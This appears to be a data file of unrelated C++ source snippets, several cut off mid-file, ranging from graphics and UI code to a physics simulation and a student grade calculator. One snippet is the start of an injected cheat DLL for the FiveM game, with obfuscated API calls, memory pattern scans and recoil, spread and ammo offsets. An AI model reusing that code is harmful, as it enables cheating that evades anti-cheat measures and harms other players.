glm::normalize(vertex) * radius * 0.9;\r\n\t\t\t\tnext = glm::normalize(next) * radius * 0.9;\r\n\r\n\t\t\t\tofDrawLine(vertex, next);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tofPopMatrix();\r\n\t}\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 250;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nglm::vec3 ofApp::make_point(float R, float r, float u, float v) {\r\n\r\n\t// \u6570\u5b66\u30c7\u30c3\u30b5\u30f3\u6559\u5ba4 \u63cf\u3044\u3066\u697d\u3057\u3080\u6570\u5b66\u305f\u3061\u3000P.31\r\n\r\n\tu *= DEG_TO_RAD;\r\n\tv *= DEG_TO_RAD;\r\n\r\n\tauto x = (R + r * cos(u)) * cos(v);\r\n\tauto y = (R + r * cos(u)) * sin(v);\r\n\tauto z = r * sin(u);\r\n\r\n\treturn glm::vec3(x, y, z);\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "//\r\n// OptionSelectEngine.cpp - Contains everything to do with the OptionSelect engine, including its class.\r\n//\r\n\r\nstd::string NumberToColour(int);\r\n\r\nextern bool bAnsiVTSequences;\r\nbool bUseNewOptionSelect = true;\r\n\r\n//\r\n// ZT OptionSelectEngine - Class for OptionSelect function, allows for easy debugging too.\r\n//\r\nclass OptionSelectEngine \r\n{\r\nprivate:\r\n\t// Object ID\r\n\tint nObjectID;\r\nprotected:\r\n\r\n\t// Directions text to forward to DirectionsDisplay()\r\n\tstd::string sDirectionsText = \"Press the 'W' key or up arrow key to move up.\\nPress the 'S' key or down arrow key to move down.\\nPress ENTER to continue with selection, or ESC to exit.\";\r\n\r\n\t// The indicator string for options\r\n\tconst std::string sOptionIndicator = \"~| \"; \r\n\r\n\t// DisplayOptionsIndicator - Displays the options indicator at calltime.\r\n\t// Arguments: sColour - The foreground colour to display for the options indicator, in RGB units.\r\n\t// Return values: None\r\n\t//\r\n\tvoid DisplayOptionsIndicator(std::string sColour) {\r\n\t\t// 1. Set colour\r\n\t\tcolour(sColour, sColourGlobalBack);\r\n\t\t// 2. Display indicator\r\n\t\tstd::cout << sOptionIndicator;\r\n\t\t// 3. Set colours back to normal and exit\r\n\t\tcolour(sColourGlobal, sColourGlobalBack);\r\n\t\treturn;\r\n\t}\r\n\r\n\t// SimpleOptionSelect - A simple selection UI that allows for easy number-typing input.\r\n\t// \t\r\n\t// bCentreOptions - Centre all options according to window width.\r\n\t// bCentrePrompt - Centre prompt text according to window width.\r\n\t// \r\n\t// Pressing ESC (exit) leads to returning code -1, error returns -2, and the index of the option when input is finished is returned otherwise.\r\n\t//\r\n\tint SimpleOptionSelect(std::string sPrompt, std::string sTitle, bool bCentreOptions = false, bool bCentrePrompt = false)\r\n\t{\r\n\t\tint nInput = 0;\r\n\t\tint nOptionsLeftPaddingWidth = 0;\r\n\t\tint nPromptLeftPaddingWidth = 0;\r\n\t\tstd::vector<std::string> vsOptionIndicatorColours{};\r\n\t\tCONSOLE_SCREEN_BUFFER_INFO csbiOptionSelect;\r\n\r\n\t\t// Check if this function is meant to be used\r\n\t\tif (bUseNewOptionSelect == true) {\r\n\t\t\t// Exit - not really an error.\r\n\t\t\treturn -1;\r\n\t\t}\r\n\r\n\t\t// Calculate padding width for centring options\r\n\t\tif (bCentreOptions) {\r\n\t\t\t// Get largest option length\r\n\t\t\tint nLargestOptionLength = 0;\r\n\t\t\tfor (int i = 0; i < nSizeOfOptions; i++) {\r\n\t\t\t\tif (sOptions[i].length() > nLargestOptionLength) {\r\n\t\t\t\t\tnLargestOptionLength = sOptions[i].length();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t// Calculate padding width\r\n\t\t\tGetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbiOptionSelect);\r\n\t\t\tnOptionsLeftPaddingWidth = ((csbiOptionSelect.srWindow.Right - csbiOptionSelect.srWindow.Left) - (nLargestOptionLength + 3)) / 2; // +3 because of the \"[x] \" that is appended to each option\r\n\t\t}\r\n\r\n\t\tif (bCentrePrompt) {\r\n\t\t\t// Calculate padding width for prompt\r\n\t\t\tnPromptLeftPaddingWidth = ((csbiOptionSelect.srWindow.Right - csbiOptionSelect.srWindow.Left) - sPrompt.length()) / 2;\r\n\t\t}\r\n\r\n\r\n\t\t// Initialise option indicator colour vector\r\n\t\tfor (int i = 0; i < nSizeOfOptions; i++) {\r\n\t\t\t// Calculate another random colour\r\n\t\t\tvsOptionIndicatorColours.push_back(NumberToColour(RandNum(16, 1)));\r\n\t\t}\r\n\r\n\t\t// Output a newline to prevent errors with overwriting cells of text\r\n\t\tstd::cout << '\\n';\r\n\r\n\t\t// Display centred title\r\n\t\tCentreColouredText(sTitle, 1);\r\n\r\n\t\t// Display prompt message for selection options with underline\r\n\t\tif (sPrompt != \"\") {\r\n\t\t\tstd::cout << \"\\n\";\r\n\t\t\tstd::cout << (bCentrePrompt ? std::string(nPromptLeftPaddingWidth, ' ') : \"\") << wordWrap(sPrompt) << \"\\n\\n\";\r\n\t\t}\r\n\r\n\t\t// Render options\r\n\t\tfor (int i = 0; i < nSizeOfOptions; i++) \r\n\t\t{\r\n\t\t\t// Output number of spaces based on padding\r\n\t\t\tstd::cout << std::string(nOptionsLeftPaddingWidth, ' ');\r\n\r\n\t\t\t// Set brackets to option indicator colour\r\n\t\t\tcolour(vsOptionIndicatorColours[i], sColourGlobalBack);\r\n\t\t\tstd::cout << '[';\r\n\t\t\tcolour(sColourGlobal, sColourGlobalBack);\r\n\r\n\t\t\tstd::cout << i + 1;\r\n\r\n\t\t\t// Set brackets to option indicator colour\r\n\t\t\tcolour(vsOptionIndicatorColours[i], sColourGlobalBack);\r\n\t\t\tstd::cout << \"] \";\r\n\t\t\tcolour(sColourGlobal, sColourGlobalBack);\r\n\r\n\t\t\tstd::cout << sOptions[i] << \"\\n\";\r\n\t\t}\r\n\r\n\t\tstd::cout << '\\n';\r\n\t\twhile (true) {\r\n\t\t\t// Input centred when options are centred - avoids overcomplication\r\n\t\t\tnInput = NumInputi(bCentreOptions ? CentreText(\"Please input your desired option number (input 0 to exit): > \") : \"Please input your desired option number (input 0 to exit): > \");\r\n\r\n\t\t\tif (nInput == 0) {\r\n\t\t\t\treturn -1;\r\n\t\t\t}\r\n\t\t\telse if (nInput < 1 || nInput > nSizeOfOptions) {\r\n\t\t\t\tcolour(RED, sColourGlobalBack);\r\n\t\t\t\tstd::cerr << wordWrap(\"Sorry, but your input is below 1 or above \" + std::to_string(nSizeOfOptions) + \".\\nThere is no option associated with the inputted option number. Please try again.\\n\");\r\n\t\t\t\tcolour(sColourGlobal, sColourGlobalBack);\r\n\t\t\t}\r\n\t\t\telse break;\r\n\t\t}\r\n\r\n\t\treturn nInput;\r\n\t}\r\n\r\npublic:\r\n\r\n\tint nSizeOfOptions = 0;\r\n\tstd::string* sOptions {};\r\n\r\n\tOptionSelectEngine() {\r\n\t\tstatic int nStaticID = 10000;\r\n\t\t// Wrap-around to preve",
    "/*\n * Copyright (C) 1998-2018 ALPS Collaboration. See COPYRIGHT.TXT\n * All rights reserved. Use is subject to license terms. See LICENSE.TXT\n * For use in publications, see ACKNOWLEDGE.TXT\n */\n\n#include \"2DRBI.hpp\"\n#include \"mpi.hpp\"\n#include \"temperature.hpp\"\n\n#include <algorithm>\n#include <cmath>\n#include <exception>\n#include <fstream>\n#include <functional>\n#include <iostream>\n#include <iterator>\n#include <limits>\n#include <map>\n#include <mutex>\n#include <random>\n#include <regex>\n#include <sstream>\n#include <string>\n#include <tuple>\n#include <vector>\n\n#include <alps/hdf5.hpp>\n#include <alps/params.hpp>\n#include <alps/accumulators.hpp>\n#include <alps/mc/api.hpp>\n#include <alps/mc/mcbase.hpp>\n#include <alps/mc/stop_callback.hpp>\n\nint main(int argc, char** argv)\n{\n    // Define the type for the simulation\n    typedef ising_sim my_sim_type;\n    using temperature = phase_space_point::temperature;\n    \n    mpi::environment env(argc, argv, mpi::environment::threading::multiple);\n    mpi::communicator comm_world;\n\n    const bool is_master = (comm_world.rank() == 0);\n\n    try {\n        // Creates the parameters for the simulation\n        // If an hdf5 file is supplied, reads the parameters there\n        if (is_master)\n            std::cout << \"Creating simulations...\" << std::endl;\n        \n        alps::params parameters(argc, argv);\n        my_sim_type::define_parameters(parameters);\n        \n        \n        if (parameters.help_requested(std::cout) ||\n            parameters.has_missing(std::cout)) {\n            return 1;\n        }\n        \n        int N_replica = (int)(parameters[\"N_replica\"]);\n\n        //start with a different Seed so we have a different physical realization of the system in every new simulation\n        parameters[\"SEED\"]=int(parameters[\"SEED\"]);\n\n        my_sim_type sim(parameters,1*comm_world.rank());\n        // sim.rebind_communicator(comm_world);\n        \n        // If needed, restore the last checkpoint\n        std::string checkpoint_file = parameters[\"checkpoint\"].as<std::string>();\n        if(comm_world.rank() != 0) checkpoint_file+=\".\"+std::to_string(comm_world.rank());\n        if (parameters.is_restored()) {\n            std::cout << \"Restoring checkpoint from \" << checkpoint_file << std::endl;\n            sim.load(checkpoint_file);\n        }\n        int L = parameters[\"L\"];\n        double dis = parameters[\"disorder\"];\n        std::string init_state = parameters[\"initial_state\"];\n        std::ifstream Tp_points(\"../L_\" + std::to_string(L) + \"/\" + \"p_\"+std::to_string(dis).substr(0,5) + \"/\"  + init_state + \"/Seed_0/T-p_points.data\");\n\n        std::vector<double> T_vec;\n        std::vector<double> p_vec;\n        T_vec.resize(std::size_t((int) parameters[\"N_replica\"]+1));\n        p_vec.resize(std::size_t((int) parameters[\"N_replica\"]+1));\n        for (int i=0; i<T_vec.size(); i++){\n            Tp_points >> T_vec[i];\n            Tp_points >> p_vec[i];\n        }\n        Tp_points.close();\n\n\n\n        auto this_temp = [&parameters, &T_vec](size_t i, size_t N) -> temperature {\n            return T_vec[i];\n        }(comm_world.rank(), comm_world.size());\n\n\n\n\n        if(!parameters.is_restored() )\n            sim.reset_sweeps(!sim.update_phase_point(this_temp));            \n        sim.update_phase_point(this_temp);\n\n\n        bool finished = sim.run(alps::stop_callback(size_t(parameters[\"timelimit\"])));\n\n\n        mpi::barrier(comm_world);\n\n        // Checkpoint the simulation\n        mpi::mutex archive_mutex(comm_world);\n\n//            std::cout << \"Checkpointing simulation to \" << checkpoint_file << std::endl;\n        {\n            std::lock_guard<mpi::mutex> archive_guard(archive_mutex);\n//                sim.save(checkpoint_file);\n        }\n        sim.update_phase_point(this_temp);\n                \n        mpi::barrier(comm_world);\n        \n        alps::results_type<my_sim_type>::type results = alps::collect_results(sim);\n        \n        // Save results to the .out.h5 file\n        {    \n\n\n            //  Delivers a vector of separate OP names\n            std::string orders = parameters[\"orders\"];\n            size_t pos = 0;\n            std::string delimiter = \";\";\n            std::string token;\n            std::vector<std::string> op_names;\n            while ((pos = orders.find(delimiter)) != std::string::npos)\n            {\n                token = orders.substr(0, pos);\n                op_names.push_back(token);\n                orders.erase(0, pos + delimiter.length());\n            }\n\n            using alps::accumulators::result_wrapper;   // This also adds the Jackknife binning, without need of extensive timeseries analysis !\n\n            std::lock_guard<mpi::mutex> archive_guard(archive_mutex);\n            std::string output_file = parameters[\"outputfile\"];\n            alps::hdf5::archive ar(output_file, \"w\");\n            if (comm_world.rank() == 0 )\n                ar[\"/parameters\"] << parameters;\n            ar[\"/simulation/results/\" + std::to_string(comm_world.rank())] << results;\n   ",
    "/*\n\n* Author:       Rick Candell (rick.candell@nist.gov)\n*\n* Organization: National Institute of Standards and Technology\n*               U.S. Department of Commerce\n* License:      Public Domain\n\n*/\n// rtclient.cpp : Defines the main() entry point for the console application.\n//\n\n#include <boost/system/config.hpp>\n#include <boost/program_options.hpp>\n#include <boost/interprocess/shared_memory_object.hpp>\n#include <boost/interprocess/mapped_region.hpp>\n\n#include <boost/array.hpp>\n#include <boost/asio.hpp>\n\nusing boost::asio::ip::udp;\n\n#define CMD_SHMEM_NAME (\"cmd_shmem\")\n\n#include <fstream>\n#include <iostream>\n#include <iomanip>\n#include <math.h>\n#include <utility>\n\n#include <boost/algorithm/string.hpp>\n\nusing boost::asio::ip::udp;\nusing namespace std;\n\nint main(int argc, char* argv[])\n{\n\t// program option variables\n\tunsigned serverPort = 17998;\n\tstring bindAddr = \"127.0.0.1\";\n\n\n\t// program options\n\tnamespace po = boost::program_options;\n\tpo::options_description desc(\"Allowed options\");\n\tdesc.add_options()\n\t\t(\"help,h\",\t\t\t\t\t\t\t\t\t\t\t\t\t\"print the help message\")\n\t\t(\"port,p\",\t\tpo::value<unsigned>(&serverPort),\t\t\t\"server port number\")\n\t\t(\"addr,a\",\t\tpo::value<string>(&bindAddr),\t\t\t\t\"bind address\")\n\t\t;\n\n\tpo::variables_map vm;\n\ttry\t{\n\t\tpo::store(po::parse_command_line(argc, argv, desc), vm);\n\t\tif (vm.count(\"help\"))\n\t\t{\n\t\t\tstd::cout << desc << std::endl;\n\t\t\treturn 0;\n\t\t}\n\n\t\tpo::notify(vm);\n\t}\n\tcatch (po::error& e) {\n\t\tstd::cerr << \"ERROR: \" << e.what() << std::endl << std::endl;\n\t\tstd::cerr << desc << std::endl;\n\t\treturn 0;\n\t}\n\n\t// set up the shared memory for the command messages to the ROS controller\n\tusing namespace boost::interprocess;\n\ttry\n\t{\n\t\tif (vm.count(\"x\"))\n\t\t{\n\t\t\tshared_memory_object msg_shm(open_only, CMD_SHMEM_NAME, read_write);\n\t\t\tmapped_region reg_msg(msg_shm, read_write);\n\t\t}\n\t}\n\tcatch (interprocess_exception & ex)\n\t{\n\t\tstd::cout << ex.what() << std::endl;\n\t\treturn 1;\n\t}\n\n\t// open UDP socket\n\n\n\t// wait for data\n\n\n\t// write data to shared memory\n\n\n\t// close UDP socket\n\t\n\n\treturn 0;\n}\n",
    "//Made by :Abubakar Aamir .\r\n//Write a C++ program that takes input regarding a student's personal details and marks obtained in various subjects, calculates the percentage, assigns a grade, and provides remarks based on the obtained percentage.\"\r\n \r\n                      //PSEUDOCODE OF THIS PROGRAM:\r\n\r\n\r\n// 1. Start\r\n\r\n// 2. Input student details: Name, Fathername, rollno, semester\r\n\r\n// 3. Input marks for subjects: calculus, pst, Pf, english, Ds\r\n\r\n// 4. Calculate total obtained marks: obtained = calculus + pst + Pf + english + Ds\r\n\r\n// 5. Calculate percentage: percentage = (obtained / 500) * 100\r\n\r\n// 6. Output student details and marks\r\n\r\n// 7. Determine grade based on percentage:\r\n//    - If percentage >= 80, output \"Grade A-1\"\r\n//    - Else if percentage >= 70, output \"Grade A\"\r\n//    - Else if percentage >= 60, output \"Grade B\"\r\n//    - Else if percentage >= 50, output \"Grade C\"\r\n//    - Else if percentage >= 40, output \"Grade D\"\r\n//    - Else if percentage >= 33, output \"Grade E\"\r\n//    - Else, output \"Grade F== fail\"\r\n\r\n// 8. Determine remarks based on percentage:\r\n//    - If percentage >= 80, output \"Remarks: Excellent\"\r\n//    - Else if percentage >= 70, output \"Remarks: Very good\"\r\n//    - Else if percentage >= 60, output \"Remarks: Good\"\r\n//    - Else if percentage >= 50, output \"Remarks: Fair\"\r\n//    - Else if percentage >= 40, output \"Remarks: Poor\"\r\n//    - Else if percentage >= 33, output \"Remarks: You need a lot of improvement\"\r\n//    - Else, output \"Remarks: Bring your parents tomorrow\"\r\n\r\n// 9. End\r\n\r\n\r\n#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n\r\n    int main() {\r\n    string Name, Fathername;// String data type  character ke liye use karte ha aur humne bhi kiya ha \r\n    int rollno, semester;//// Taking rollnumber and semester in integar data type because number type ka data type ha hamara\r\n    int calculus, pst, Pf, english, Ds, obtained, percentage;// taking more integars for subjects marks\r\n\r\n    cout << \"Enter your name: \";//Cout<< is used to print the message like printf();\r\n    cin >> Name;// cin>> is used t0 taking input from the user like scanf();\r\n\r\n    cout << \"Enter your father's name: \";\r\n    cin >> Fathername;\r\n\r\n    cout << \"Enter your roll number: \";\r\n    cin >> rollno;\r\n\r\n    cout << \"Enter your semester: \";\r\n    cin >> semester;\r\n\r\n    cout << \"Enter your marks for each subject:\" << endl;\r\n    \r\n    cout << \"Calculus: \";\r\n    cin >> calculus;\r\n    \r\n    cout << \"English: \";\r\n    cin >> english;\r\n    \r\n    cout << \"PST: \";\r\n    cin >> pst;\r\n    \r\n    cout << \"Discrete structure: \";\r\n    cin >> Ds;\r\n    \r\n    cout << \"Programming Fundamentals: \";\r\n    cin >> Pf;\r\n\r\n//upper humne aik obtained ka variable banaya tha ab usmei sare subjects ke marks ko plus karwa diya ha humne\r\n    obtained = english + Pf + Ds + pst + calculus;\r\n    percentage = obtained * 100 / 500;\r\n\r\n    cout << \"-----------Marksheets-------------------\" << endl;\r\n    cout << \"Your Name is \" << Name << endl;\r\n    cout << \"Your Father's Name is \" << Fathername << endl;\r\n    cout << \"Your Class is \" << semester << endl;\r\n    cout << \"Your Roll no is \" << rollno << endl;\r\n    cout << \"Your obtained marks is \" << obtained << endl;\r\n    cout << \"Your percentage is \" << percentage << endl;\r\n\r\n//using if and else if condition to find:agar number 80 ha toh your grade is A-1 :and so on\r\n    if (percentage >= 80)\r\n        cout << \"Grade A-1\" << endl;\r\n    else if (percentage >= 70)\r\n        cout << \"Grade A\" << endl;\r\n    else if (percentage >= 60)\r\n        cout << \"Grade B\" << endl;\r\n    else if (percentage >= 50)\r\n        cout << \"Grade C\" << endl;\r\n    else if (percentage >= 40)\r\n        cout << \"Grade D\" << endl;\r\n    else if (percentage >= 33)\r\n        cout << \"Grade E\" << endl;\r\n    else\r\n        cout << \"Grade F== fail\" << endl;\r\n\r\n//here we give the remarks (agar 80 se zada ha toh exellent and so on)\r\n    if (percentage >= 80)\r\n        cout << \"Remarks: Excellent\" << endl;\r\n    else if (percentage >= 70)\r\n        cout << \"Remarks: Very good\" << endl;\r\n    else if (percentage >= 60)\r\n        cout << \"Remarks: Good\" << endl;\r\n    else if (percentage >= 50)\r\n        cout << \"Remarks: Fair\" << endl;\r\n    else if (percentage >= 40)\r\n        cout << \"Remarks: Poor\" << endl;\r\n    else if (percentage >= 33)\r\n        cout << \"Remarks: You need a lot of improvement\" << endl;\r\n    else\r\n        cout << \"Remarks: Bring your parents tomorrow\" << endl;\r\n\r\n\r\n    return 0;\r\n}",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "/*!\n\tSPDX-FileCopyrightText: 2018-2024 Igor Mironchik <igor.mironchik@gmail.com>\n\tSPDX-License-Identifier: GPL-3.0-or-later\n*/\n\n// GIF editor include.\n#include \"busyindicator.hpp\"\n\n// Qt include.\n#include <QPainter>\n#include <QVariantAnimation>\n#include <QPainterPath>\n\n\n//\n// BusyIndicatorPrivate\n//\n\nclass BusyIndicatorPrivate {\npublic:\n\tBusyIndicatorPrivate( BusyIndicator * parent )\n\t\t:\touterRadius( 10 )\n\t\t,\tinnerRadius( static_cast< int > ( outerRadius * 0.6 ) )\n\t\t,\tsize( outerRadius * 2, outerRadius * 2 )\n\t\t,\trunning( true )\n\t\t,\tanimation( nullptr )\n\t\t,\tq( parent )\n\t{\n\t}\n\n\tvoid init();\n\n\tint outerRadius;\n\tint innerRadius;\n\tint percent = 0;\n\tQSize size;\n\tQColor color;\n\tbool running;\n\tbool showPercent = false;\n\tQVariantAnimation * animation;\n\tBusyIndicator * q;\n}; // class BusyIndicatorPrivate\n\nvoid\nBusyIndicatorPrivate::init()\n{\n\tanimation = new QVariantAnimation( q );\n\tanimation->setStartValue( 0.0 );\n\tanimation->setEndValue( 359.0 );\n\tanimation->setDuration( 1000 );\n\tanimation->setLoopCount( -1 );\n\n\tQObject::connect( animation, &QVariantAnimation::valueChanged,\n\t\tq, &BusyIndicator::_q_update );\n\n\tcolor = q->palette().color( QPalette::Highlight );\n\n\tanimation->start();\n}\n\n\n//\n// BusyIndicator\n//\n\nBusyIndicator::BusyIndicator( QWidget * parent )\n\t:\tQWidget( parent )\n\t,\td( new BusyIndicatorPrivate( this ) )\n{\n\td->init();\n}\n\nBusyIndicator::~BusyIndicator() noexcept\n{\n\td->animation->stop();\n}\n\nbool\nBusyIndicator::isRunning() const\n{\n\treturn d->running;\n}\n\nvoid\nBusyIndicator::setRunning( bool on )\n{\n\tif( on != d->running )\n\t{\n\t\td->running = on;\n\n\t\tif( d->running )\n\t\t{\n\t\t\tshow();\n\t\t\td->animation->start();\n\t\t}\n\t\telse\n\t\t{\n\t\t\thide();\n\t\t\td->animation->stop();\n\t\t}\n\t}\n}\n\nconst QColor &\nBusyIndicator::color() const\n{\n\treturn d->color;\n}\n\nvoid\nBusyIndicator::setColor( const QColor & c )\n{\n\tif( d->color != c )\n\t{\n\t\td->color = c;\n\t\tupdate();\n\t}\n}\n\nint\nBusyIndicator::radius() const\n{\n\treturn d->outerRadius;\n}\n\nvoid\nBusyIndicator::setRadius( int r )\n{\n\tif( d->outerRadius != r )\n\t{\n\t\td->outerRadius = r;\n\t\td->innerRadius = static_cast< int > ( d->outerRadius * 0.6 